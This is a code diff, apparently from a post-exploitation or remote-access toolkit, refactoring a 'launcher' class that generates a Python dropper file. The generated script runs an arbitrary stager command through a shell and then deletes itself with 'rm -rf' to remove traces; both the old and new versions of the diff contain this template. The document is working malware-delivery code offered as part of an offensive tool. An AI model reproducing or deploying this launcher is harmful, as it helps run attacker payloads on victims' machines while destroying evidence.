@@ -1,21 +1,21 @@
-from helpers import *
+from launchers.helpers import *
 
 
-class Launcher:
-    def __init__(self):
-        self.info = {
+class Launcher(LauncherABC):
+    def get_info(self):
+        return {
             "Author": ["Marten4n6"],
             "Description": "Creates a python file launcher.",
             "References": [],
         }
 
-    def generate(self, stager):
+    def generate(self, stager: str):
         return ("py", """\
         #!/usr/bin/env python
         # -*- coding: utf-8 -*-
-        # %s
+        # {}
         import subprocess
 
-        subprocess.Popen("%s", shell=True)
+        subprocess.Popen("{}", shell=True)
         subprocess.Popen("rm -rf " + __file__, shell=True)
-        """ % (random_string(numbers=True), stager.replace('"', '\\"')))
+        """.format(random_string(numbers=True), stager.replace('"', '\\"')))
